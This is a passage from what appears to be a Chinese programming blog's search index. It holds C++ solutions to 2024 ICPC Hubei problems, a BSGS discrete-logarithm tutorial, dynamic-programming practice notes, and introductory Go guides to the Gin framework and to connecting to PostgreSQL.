\u003c= 19; i++) for(int j = 1; j \u003c= 19; j++) st[i][j] = 0; int x, y; scanf(\"%d%d\", \u0026x, \u0026y); mp[x][y] = flag; int cntb = 0, cntw = 0; for(int u = 0; u \u003c 5; u++){ int i = x + dx[u], j = y + dy[u]; if(mp[i][j] != 0 \u0026\u0026 !st[i][j]){ if(mp[i][j] == flag) continue;//先检查不同颜色。 int life = 0; queue\u003cpair\u003cint, int\u003e\u003e que; que.push({i, j}); vector\u003cpair\u003cint,int\u003e\u003e pos; st[i][j] = true; while(que.size()){ auto tmp = que.front(); que.pop(); pos.push_back(tmp); for(int q = 0; q \u003c 4; q++){ int a = tmp.first + dx[q], b = tmp.second + dy[q]; if(a \u003c 1 || a \u003e 19 || b \u003c 1 || b \u003e 19 || st[a][b]) continue; if(mp[a][b] == 3 - mp[i][j]) continue; if(mp[a][b] == 0) {life++;continue;}; st[a][b] = true; que.push({a,b}); } } if(life == 0){ if(mp[i][j] == 1) cntb += pos.size(); else cntw += pos.size(); for(auto [a,b]:pos){ mp[a][b] = 0; } } } } for(int i = 1; i \u003c= 19; i++) for(int j = 1; j \u003c= 19; j++) st[i][j] = 0; for(int u = 0; u \u003c 5; u++){//要检查落下的这颗棋子的位置 int i = x + dx[u], j = y + dy[u]; if(mp[i][j] != 0 \u0026\u0026 !st[i][j]){ if(mp[i][j] == 3 - flag) continue;//再检查相同颜色 int life = 0; queue\u003cpair\u003cint, int\u003e\u003e que; que.push({i, j}); vector\u003cpair\u003cint,int\u003e\u003e pos; st[i][j] = true; while(que.size()){ auto tmp = que.front(); que.pop(); pos.push_back(tmp); for(int q = 0; q \u003c 4; q++){ int a = tmp.first + dx[q], b = tmp.second + dy[q]; if(a \u003c 1 || a \u003e 19 || b \u003c 1 || b \u003e 19 || st[a][b]) continue; if(mp[a][b] == 3 - mp[i][j]) continue; if(mp[a][b] == 0) {life++;continue;}; st[a][b] = true; que.push({a,b}); } } if(life == 0){ if(mp[i][j] == 1) cntb += pos.size(); else cntw += pos.size(); for(auto [a,b]:pos){ mp[a][b] = 0; } } } } printf(\"%d %d\\n\", cntb, cntw); flag = 3 - flag; } }","date":"2024-06-11","objectID":"/posts/583bc6c/:4:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - H - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:5:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路：\r用十位四进制数表示鱼塘中剩下的鱼，每一位是一个块内剩下的鱼，将(sum)4 变为(0)4。 枚举5*k个位置投放i枚炸弹后的状态转移 在i,j位置放x枚炸弹，使得五个位置中减少的鱼的数量的状态位四进制数(x)4 枚举当前所有的状态，对每一个状态和这个四进制数进行check，每一个四进制位取两者的最小值（能够改变的状态）得到一个新的四进制数tmp，并记录实际有效的炸弹数量cnt，则状态转移方程为dp[key - tmp] = min(dp[key - tmp], dp[key] + cnt); 最后答案即为dp[0] ","date":"2024-06-11","objectID":"/posts/583bc6c/:5:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"code:\r#include \u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll mp[1010][1010]; ll dx[] = {0, 0,1,0,-1}; ll dy[] = {0,1,0,-1,0}; ll pos[1010][1010]; ll st[1010][1010]; ll idx = 0; ll dp[2000010]; ll pow4[20]; ll num = 0; ll check(ll a, ll b){ ll res = 0; num = 0; ll cnt = 0; while(b){ ll f1 = a % 4; ll f2 = b % 4; res += pow4[cnt] * min(f1, f2); num = max(num, min(f1, f2));//实际生效的炸弹数量 b /= 4; a /= 4; cnt++; } return res; //a状态-res后转移到新状态 } void solve(){ set\u003cll\u003e all; ll n, m, k; scanf(\"%lld%lld%lld\", \u0026n, \u0026m, \u0026k); ll mx = 0; for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= m; j++) pos[i][j] = -1; vector\u003cpair\u003cint, int\u003e\u003e f; for(int i = 1; i \u003c= k; i++){ ll x, y, a; scanf(\"%lld%lld%lld\", \u0026x, \u0026y, \u0026a); mp[x][y] = a; mx += pow4[idx] * a; pos[x][y] = idx++;//每一个有鱼的块对于四进制数中的一位 for(int q = 0; q \u003c 5; q++){ ll xx = x + dx[q], yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; f.push_back({xx,yy}); } } for(int i = 0; i \u003c= mx; ++i) dp[i] = 0x3f; dp[mx] = 0; all.insert(mx); for(auto [x,y]:f){//枚举每一个可以投掷炸弹的位置 if(st[x][y]) continue;//重叠的区域 st[x][y] = 1; for(ll i = 1; i \u003c= 3; i++){ ll boom = 0; for(ll q = 0; q \u003c 5; q++){ ll xx = x + dx[q]; ll yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; if(pos[xx][yy] \u003e -1){ boom += pow4[pos[xx][yy]] * i; } } for(auto key:all){//枚举所有状态 ll tmp1 = check(key, boom); if(tmp1 \u003e key) continue; dp[key - tmp1] = min(dp[key - tmp1], dp[key] + num); all.insert(key - tmp1);//添加新状态 } } } printf(\"%lld\\n\", dp[0]); } int main() { pow4[0] = 1; for(int i = 1; i \u003c= 11; i++){ pow4[i] = pow4[i - 1] * 4;//4的幂次 } int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/583bc6c/:5:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - J - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:6:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路：\r结论题：ans = sum / n ","date":"2024-06-11","objectID":"/posts/583bc6c/:6:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code：\rconst int mod = 998244353; ll a[1000010]; ll ksm(ll a, ll b){ ll ans = 1; while(b){ if(b \u0026 1) ans = (ans * a)% mod; a = (a * a) % mod; b \u003e\u003e= 1; } return ans; } void solve(){ int n; cin \u003e\u003e n; ll tmp = 0; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; if(n == 1){ cout \u003c\u003c a[1]; return; } for(int i = 1; i \u003c= n; i++) tmp = (tmp + a[i]) % mod; cout \u003c\u003c (tmp * ksm(n, mod - 2) )% mod; }","date":"2024-06-11","objectID":"/posts/583bc6c/:6:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - L - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:7:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\rdist(a, b)表示从a到b的cost（规定a \u003c b）： 两个都是质数时：min(a * b, 2 * (a + b)) a == b时： 0 b % a == 0：b gcd（a, b) \u003e 1时：a+b gcd == 1 一个复数：质数到复数的最小质因子p，再从最小质因子到复数 dist(a, p) + dist(b, p); 两个复数：分别用两数的最小质因子，取min. min(dist(a, p1) + dist(b,p1), dist(a,p2) + dist(b,p2)); ","date":"2024-06-11","objectID":"/posts/583bc6c/:7:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rmap\u003cpair\u003cll,ll\u003e, ll\u003e mp; ll dist(ll a, ll b){ if(a == b) return 0; if(a \u003e b) swap(a, b); if(mp.find({a,b}) != mp.end()) return mp[{a,b}]; if(b % a == 0) { mp[{a,b}] = b; return b; } ll g = gcd(a, b); if(g \u003e 1) { mp[{a,b}] = a + b; return a + b; } ll x = get(a), y = get(b); if(x == a \u0026\u0026 y == b) { mp[{a,b}] = min(a * b, 2LL * (a + b)); return mp[{a, b}]; } else{ if(x == a){ mp[{a, b}] = dist(a, y) + dist(y, b); return mp[{a, b}]; }else if(y == b){ mp[{a, b}] = dist(a, x) + dist(b, x); return mp[{a, b}]; }else{ ll d1 = dist(a, y) + dist(y, b); ll d2 = dist(b, x) + dist(x, a); mp[{a, b}] = min(d1, d2); return mp[{a, b}]; } } } void solve(){ ll a, b; cin \u003e\u003e a \u003e\u003e b; cout \u003c\u003c dist(a, b) \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/583bc6c/:7:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["算法和数据结构"],"content":"BSGS\r2023-08-17 | 算法 | 2 reads 字数:559 BSGS算法(BABY-STEP GIANT-STEP)，又称大步小步法，通常用于求解高阶线性同余方程如：ax ≡ b (mod p)𝑎𝑥 ≡ 𝑏 (𝑚𝑜𝑑 𝑝)。根据p是否为质数，有扩展BSGS算法和BSGS算法。 BSGS通过欧拉定理及其拓展确定x的范围，再通过暴力枚举求解x。其本质是分块思想。 欧拉定理： 具体内容： aφ(m) ≡ 1( mod m)𝑎φ(𝑚) ≡ 1( 𝑚𝑜𝑑 𝑚) 。 其中 φ(m)φ(𝑚) 是 m 的欧拉函数，当m为质数p时，欧拉定理退化为费马小定理：a(p−1) ≡ 1( mod p)𝑎(𝑝−1) ≡ 1( 𝑚𝑜𝑑 𝑝)。(质数p的欧拉函数=p-1) 重要推论：当a与m互质时，有ab = ab mod φ(m)𝑎𝑏 = 𝑎𝑏 𝑚𝑜𝑑 φ(𝑚),利用这个推论，即使b比较大，也能轻松计算ab mod m𝑎𝑏 𝑚𝑜𝑑 𝑚的值 当a与m不互质时，采用拓展欧拉定理：若b ≥ φ(m)𝑏 ≥ φ(𝑚),则ab ≡ ab mod φ(m) + φ(m) (mod m)𝑎𝑏 ≡ 𝑎𝑏 𝑚𝑜𝑑 φ(𝑚) + φ(𝑚) (𝑚𝑜𝑑 𝑚),b \u003c φ(m)𝑏 \u003c φ(𝑚)时直接用快速幂计算 求解ax ≡ b (mod p)𝑎𝑥 ≡ 𝑏 (𝑚𝑜𝑑 𝑝)问题，当P为质数时， 由欧拉定理的推论可知ab = ab mod φ(p) (mod p)𝑎𝑏 = 𝑎𝑏 𝑚𝑜𝑑 φ(𝑝) (𝑚𝑜𝑑 𝑝)，ax𝑎𝑥在模P意义下的最小循环节为φ(p)φ(𝑝),因为p为质数所以φ(p) ＝ p−1φ(𝑝) ＝ 𝑝−1,故在[0,p][0,𝑝]之间，必能找到最小整数x。 采取暴力枚举的方法求p： 假设x = im - j,则有aim ≡ b∗aj ( mod p)𝑎𝑖𝑚 ≡ 𝑏∗𝑎𝑗 ( 𝑚𝑜𝑑 𝑝),其中m = ceil(sqrt(p))为根号P向上取整,这时只需要直接枚举左右两边的情况; 我们可以采用哈希表存储 枚举右边时，当键b∗aj𝑏∗𝑎𝑗重复出现时，令对应的值等于较大的j； 由于要求最小非负解x，则令i从1开始枚举，当aim𝑎𝑖𝑚的值在哈希表中重复出现时，说明找了到了解，并且这个解是满足条件的最小非负解，因为保证了i尽可能小，j尽可能大。 把区间分为√p𝑝块,每块长√p𝑝,根据i的值im分别对应了√p𝑝个小区间，i递增即检查每个小区间内有没有符合条件的解。i的一小步，在区间上跨越了一大步，所以叫做 BABY-STEP GIANT-STEP算法。其本质是分块思想。 typedef long long ll; ll fpow(ll a, ll b, ll p) { ll res = 1; while (b) { if (b \u0026 1) res = res * a % p; a = a * a % p; b \u003e\u003e= 1; } return res; } ll bsgs(ll a, ll b, ll p) { a %= p, b %= p; if(a == 0) return b == 0 ? 1 : -1; if(b == 1) return 0; ll m = ceil(sqrt(p)), inv = fpow(a, m, p); unordered_map\u003cll, ll\u003e mp; mp[b] = 0; ll tmp = inv; for (int i = 1, e = b; i \u003c m; i++) { e = e * a % p; mp[e] = i; } for (int i = 1; i \u003c= m; i++) { if (mp.find(inv) != mp.end()) { return i * m - mp[inv]; } inv = inv * tmp % p; } return -1; }当p为非质数时，使用扩展BSGS算法 typedef long long ll; ll fpow(ll a, ll b, ll p)//求快速幂 { ll res = 1; while (b) { if (b \u0026 1) res = res * a % p; a = a * a % p; b \u003e\u003e= 1; } return res; } ll bsgs(ll a, ll b, ll p)//bsgs { a %= p, b %= p; if (a == 0) return b == 0 ? 1 : -1; if (b == 1) return 0; ll m = ceil(sqrt(p)), t = fpow(a, m, p); unordered_map\u003cll, ll\u003e mp; mp[b] = 0; ll tmp = t; for (int i = 1, e = b; i \u003c m; i++) { e = e * a % p; mp[e] = i; } for (int i = 1; i \u003c= m; i++) { if (mp.find(t) != mp.end()) { return (i * m - mp[t] + p) % p; } t = t * tmp % p; } return -1; } ll gcd(ll a, ll b)//欧几里得 { return b ? gcd(b, a % b) : a; } ll exgcd(ll a, ll b, ll\u0026 x, ll\u0026 y)//扩欧求逆元 { if (b == 0) { x = 1, y = 0; return a; } ll d = exgcd(b, a % b, y, x); y -= a / b * x; return d; } ll inv(ll a, ll b)求逆元 { ll x, y; exgcd(a, b, x, y); return (x % b + b) % b; } ll exbsgs(ll a, ll b, ll p)//扩展bsgs { if (b == 1 || p == 1)return 0; ll g = gcd(a, p), k = 0, na = 1; while (g \u003e 1) { if (b % g != 0)return -1; k++; b /= g; p /= g; na = na * (a / g) % p; if (na == b)return k; g = gcd(a, p); } ll f = bsgs(a, b * inv(na, p) % p, p); if (f == -1)return -1; return f + k; }","date":"2024-06-11","objectID":"/posts/bsgs/:0:0","tags":["算法"],"title":"BSGS","uri":"/posts/bsgs/"},{"categories":["算法和数据结构"],"content":"DP\r","date":"2024-06-11","objectID":"/posts/dp%E9%A2%98%E7%9B%AE/:1:0","tags":["算法"],"title":"DP练习记录","uri":"/posts/dp%E9%A2%98%E7%9B%AE/"},{"categories":["算法和数据结构"],"content":"洛谷P1541\r[P1095 NOIP2007 普及组] 守望者的逃离 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) [P1541 NOIP2010 提高组] 乌龟棋 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) 首先考虑状态，在出第i张牌时，值只和dp[i - 1]有关，但有四种情况，同时需要知道当前能获取的价值（走到了哪里）。如果能记录下先前都出了什么牌以及获得的总价值，就能解决这个问题。由于有四类牌，设一个四维数组dp[a][b][c][d],表示出了a张1，b张2，c张3，d张4，dp[0][0][0][0]=val[0],那么当前获取的价值就是val[1 + a + b * 2 + c * 3 + d * 4]; 对于状态转移：当出一张1时，显然有dp[a][b][c][d] = max（dp[a][b][c][d]， dp[a - 1][b][c][d] + val[1 + a + b * 2 + c * 3 + d * 4]）,以此类推当出其他牌时同理。 那么四重循环枚举每类牌的个数即可（每类牌不超过40) #include \u003cbits/stdc++.h\u003e #define fi first; #define se second; using namespace std; typedef long long ll; typedef long double ld; typedef pair\u003cint, int\u003e pii; // 1.integer overflow (1e5 * 1e5) (2e9 + 2e9) // 2.runtime error // 3.boundary condition int f[400]; int g[5]; int dp[41][41][41][41]; int ans = 0; int n, m; void solve() { cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; i++) cin \u003e\u003e f[i]; for (int i = 0; i \u003c m; i++) { int tmp; cin \u003e\u003e tmp; g[tmp]++; } dp[0][0][0][0] = f[1]; for (int a = 0; a \u003c= g[1]; a++) for (int b = 0; b \u003c= g[2]; b++) for (int c = 0; c \u003c= g[3]; c++) for (int d = 0; d \u003c= g[4]; d++) { int r = a + 2 * b + 3 * c + 4 * d + 1; if (a != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a - 1][b][c][d] + f[r]); if (b != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a][b - 1][c][d] + f[r]); if (c != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a][b][c - 1][d] + f[r]); if (d != 0) dp[a][b][c][d] = max(dp[a][b][c][d], dp[a][b][c][d - 1] + f[r]); } cout \u003c\u003c dp[g[1]][g[2]][g[3]][g[4]]; } int main() { ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while (t--) { solve(); } return 0; }P1868 饥饿的奶牛 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) 以区间为单位进行考虑的话，每个区间只有取和不取两种状态。将所有区间按右端点排序后，用dp[i]表示从最左端到第i个区间右端点内可以取的价值的最大值，dp[i] = max(i.r - i.l + 1 + dp[j], dp[i - 1]) 当考虑第i个区间时，只需要将它的贡献与往前数第一个不相交的区间的dp[j]加起来与dp[i - 1]做比较即可。先预处理将所有区间的右端点存储，再用二分查找优化一下找不相交区间即可。 #include \u003calgorithm\u003e #include \u003cbits/stdc++.h\u003e #include \u003cvector\u003e #define fi first; #define se second; using namespace std; typedef long long ll; typedef long double ld; typedef pair\u003cint, int\u003e pii; vector\u003cint\u003e t; //1.integer overflow (1e5 * 1e5) (2e9 + 2e9) //2.runtime error //3.boundary condition const int N = 150010; struct tmp{ int l, r; }g[N]; int dp[N]; bool cmp(struct tmp a, struct tmp b){ if(a.r == b.r) return a.l \u003c b.l; return a.r \u003c b.r; } void solve(){ int n; cin \u003e\u003e n; for(int i = 1; i \u003c= n; i++){ cin \u003e\u003e g[i].l \u003e\u003e g[i].r; } sort(g + 1, g + 1 + n, cmp); t.push_back(0); for(int i = 1; i \u003c= n; i++) t.push_back(g[i].r); dp[0] = 0; for(int i = 1; i \u003c= n; i++){ int val = g[i].r - g[i].l + 1; int pos = lower_bound(t.begin(), t.end(), g[i].l) - t.begin(); pos--; dp[i] = val + dp[pos]; dp[i] = max(dp[i], dp[i - 1]); } // for(int i = 1; i \u003c= n; i++) // cout \u003c\u003c dp[i] \u003c\u003c ' '; // cout \u003c\u003c '\\n'; cout \u003c\u003c dp[n]; } int main() { ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }[P2679 NOIP2015 提高组] 子串 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn) 字符串匹配类型的DP xxxxxxxxxx class Solution {public: vector rangeAddQueries(int n, vector\u0026 queries) { vector tmp(n+1 , vector(n+1,0)); int m = queries.size(); for(int i = 0; i \u003c m; i++) { tmp[queries[i][0]][queries[i][1]]++; tmp[queries[i][0]][queries[i][3]+1]–; tmp[queries[i][2]+1][queries[i][1]]–; tmp[queries[i][2]+1][queries[i][3]+1]++; }//对差分数组进行操作 vector ans(n , vector(n , 0)); ans[0][0] = tmp[0][0]; for(int i = 0; i \u003c n; ++i) for(int j = 1; j \u003c n; ++j) tmp[i][j] += tmp[i][j-1]; for(int i = 1; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) tmp[i][j] += tmp[i-1][j]; for(int i = 0; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) ans[i][j] = tmp[i][j]; //由于下标从0开始，所以分布求前缀和要方便一点 //这种写法不存在重复加的地方，第一个for求一维前缀和，第二个for加上前面行的和。 return ans; }}; c++ 本题是dp[i][j][k][0\\1]表示A字符串前i个、中选了k个子串匹配到B字符串前j个的方案数，因为要求不相交的子串需要知道某个字符有没有被选中，所以用第四维表示第i个字符有没有被选中。 状态转移： 显然第i个字符如果被选中那么只有2种可能：1.作为前面被选中的子串的末尾、2.作为新子串的开头 如果第i个字符被选中，那么显然A[i] = B[j] 或者A[i] != B[j] (这时方案为0)； 所以当A[i] == B[j] 时有第一类转移方程 不选:dp[i][j][k][0] = dp[i - 1][j][k][1] + dp[i - 1][j][k][0] 选:dp[i][j][k][1] = dp[i - 1][j - 1][k][1] + dp[i - 1][j - 1][k - 1]","date":"2024-06-11","objectID":"/posts/dp%E9%A2%98%E7%9B%AE/:1:1","tags":["算法"],"title":"DP练习记录","uri":"/posts/dp%E9%A2%98%E7%9B%AE/"},{"categories":["算法和数据结构"],"content":"字符串\r给出两个字符串，比较由两个字符串重复构成的无限长字符串的字典序。 若字符串A+B \u003c B + A, 则A \u003c B 反之同理 #include\u003ciostream\u003e #include\u003calgorithm\u003e #include\u003ccstring\u003e using namespace std; int main(){ string a, b; while(cin \u003e\u003e a \u003e\u003e b){ string c = a + b; string d = b + a; if(c \u003e d) puts(\"\u003e\"); else if(c \u003c d) puts(\"\u003c\"); else puts(\"=\"); } return 0; }","date":"2024-06-11","objectID":"/posts/dp%E9%A2%98%E7%9B%AE/:2:0","tags":["算法"],"title":"DP练习记录","uri":"/posts/dp%E9%A2%98%E7%9B%AE/"},{"categories":["工程"],"content":"Gin框架介绍\rGin 是一个用 Go (Golang) 编写的 HTTP Web 框架。 它具有类似 Martini 的 API，但性能比 Martini 快 40 倍。如果你需要极好的性能，使用 Gin 吧。","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:1:0","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"Gin框架安装\r要求：Go 1.13及以上版本 安装 下载并安装gin： go get -u github.com/gin-gonic/gin 在项目中引入gin： import \"github.com/gin-gonic/gin\"有时候需要使用诸如http.StatusOK之类的常量，则需要引入net/http包： import \"net/http\"","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:1:1","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"Gin框架的简单使用\rpackage main import \"github.com/gin-gonic/gin\" func main(){ router := gin.Default() router.GET(\"/ping\", func(context *gin.Context) { context.JSON(200, gin.H{\"message\": \"pong\",}) }) router.Run(\":8080\") // 监听并在 0.0.0.0:8080 上启动服务 }上述代码运行后访问https://localhost:8080/ping可以看到一个json格式的数据,{“message”:“pong”}说明代码运行成功了。 首先使用gin.Default()函数生成一个路由引擎，这个路由引擎会默认使用两个全局中间件gin.Logger()和gin.Recovery()，生成的类型为*gin.Engine的变量router是Gin框架的基础。 gin.Logger()//Logger 中间件将日志写入 gin.DefaultWriter gin.Recovery()//Recovery 中间件会 recover 任何 panic。如果有 panic 的话，会写入 500 如果想生成一个没有默认中间件的路由引擎则使用函数gin.New() router := gin.New()然后注册路由，上述代码为匿名函数的写法，以下展示注册路由和自定义函数的写法： --- router.GET(\"/path/to\", func(context *gin.Context)){函数内容}) //Get方法 router.POST(\"/path/to\", func(context *gin.Context)){函数内容}) //post方法 --- 自定义路由的方法 func helloword(context *gin.Context){ context.JSON(200, gin.H{\"message\": \"hello world\",}) } router.GET(\"/path/to\", helloword) router.POST(\"/path/to\", helloword) --- 当需要注册的路由太多时，可以采用注册路由组的方法： test := router.Group(\"/video\") { test.GET(\"/1\", func(c *gin.Context) {//访问/video/1以此类推 c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) test.GET(\"/2\", func(c *gin.Context) { c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) test.GET(\"/3\", func(c *gin.Context) { c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) test.GET(\"/4\", func(c *gin.Context) { c.JSON(http.StatusOK, gin.H{\"msg\": \"访问路由组成功\"}) }) }","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:2:0","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"从URL获得参数\r从url获得参数有GET和POST两种方法，具体区别见http请求中get和post方法的区别 - 知乎 (zhihu.com)，下面用代码展示两种方法的使用: 通过上下文对象c *gin.Context的方法获得值 //GET方法： //URL /path?id=1234\u0026name=Manu\u0026value= //GET方法使用Query获得值，Query(key string) (value string) c.Query(\"id\") == \"1234\" c.Query(\"name\") == \"Manu\" c.Query(\"value\") == \"\" c.Query(\"wtf\") == \"\" //也可以使用DefaultQuery(key string, defaultValue string) string 如果值为空则返回defaultValue的值 //QueryArray(key string) (values []string) //QueryMap(key string) (dicts map[string]string) --- //POST方法 name := c.PostForm(\"name\") price := c.DefaultPostForm(\"price\", \"100\") //c.PostForm(key string)(value string) //同样有GET类似的方法，参数和返回值一样 可以通过参数绑定获取参数 参数绑定利用反射机制，自动提取querystring，form表单，json，xml等参数到结构体中，可以极大提升开发效率。 type Teacher struct { Name string `form:\"Name\" json:\"Name\" binding:\"required\"` Email string `form:\"Email\" json:\"Email\" binding:\"required\"` Wechat string `form:\"Wechat\" json:\"Wechat\" binding:\"required\"` id int `form:\"id\" json:\"id\" binding:\"-\"` } //在变量后面加上 `form:\"Name\" json:\"Name\" binding:\"required\"`， form为表单， json为json格式的数据，binding和参数验证有关，当值为required为需要验证不能传空值，为-时不需要验证；相较于form，会优先选择json格式，json:“”中的值必须与前端参数的name一致 func test(context *gin.Context){ var information Teacher err := context.ShouldBind(\u0026information) //根据req的content type 自动推断如何绑定,form/json/xml等格式 if err != nil { context.JSON(400, gin.H{\"error\": err.Error()}) return } //这样就将获取的参数存储到了infomation变量里，通过访问结构体变量即可访问数据 }","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:2:1","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"参考资料:\r文档 | Gin Web Framework (gin-gonic.com) http请求中get和post方法的区别 - 知乎 (zhihu.com) ","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:3:0","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"Go语言连接postgresql数据库并实现基础操作教程\r","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:0:0","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"安装依赖包\rgo get -u github.com/lib/pq 参考资料: https://godoc.org/github.com/lib/pq https://www.runoob.com/postgresql/postgresql-tutorial.html ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:1:0","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"基础操作\r","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:0","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"连接数据库\rimport ( \"database/sql\" \"fmt\" _ \"github.com/lib/pq\" ) func Database_connect() *sql.DB { localDB, err := sql.Open(\"postgres\", \"host=localhost port=5432 user=postgres password=123456 dbname=test sslmode=disable\") if err != nil { fmt.Println(\"Wrong args.Connected failed.\") panic(err) } err = localDB.Ping() //ping一下验证是否连通 if err != nil { fmt.Println(\"Wrong args.Connected failed.\") panic(err) } localDB.SetMaxOpenConns(20) //设置数据库连接池最大连接数 localDB.SetMaxIdleConns(10) //设置最大空闲连接数 fmt.Println(\"Local sql Successfully connected!\") return localDB }sql.Open()函数第一个参数为驱动的名字即\"postgres\"，第二个参数是数据库信息，分别是ip、端口、数据库用户名、密码、数据库的名字、sslmode 参数用于指定数据库连接时使用的 SSL 加密模式。函数返回一个连接池的指针，只有在需要的时候才会和数据库之间产生连接。 ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:1","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"查找\rrows， err := db.Query(\"select * from test where name = $1\", myname) //(\"select 参数，参数(*表示全部参数) from 表的名字 where 参数 = $1 and 参数=$2(限制条件)\", 变量名, 变量名) if err != nil{ panic(err)//检查错误，panic会直接报错并停止程序，也可以用其他方式打印出报错，但不停止程序 } 生成的rows是一个结果集，需要用Next()方法遍历结果集 for rows.Next(){ var 变量1 数据类型 ... err = rows.Scan(\u0026变量1, \u0026...)//存储数据到创建的变量中 if err != nil{ //检查错误 } //这样就将数据库里一行的数据存储下来，遍历完数据集，便得到所有符合要求的数据 } err := db.QueryRow(\"select * from test where name = $1\", myname).Scan(\u0026参数 ....)//查询数据库中的一行并存储到变量中 var count int err := db.QueryRow(\"select count(*) from test where name = $1\", myname).Scan(\u0026count)//查询数据库中名字为myname变量值的数据行数，有时候需要提前检查是否存在数据，可以用count的方法检查 //可以用postgresql语法中的关键字、函数来辅助查询如max、min、DISTINCT等等 ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:2","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"增加and更新\r_, err = 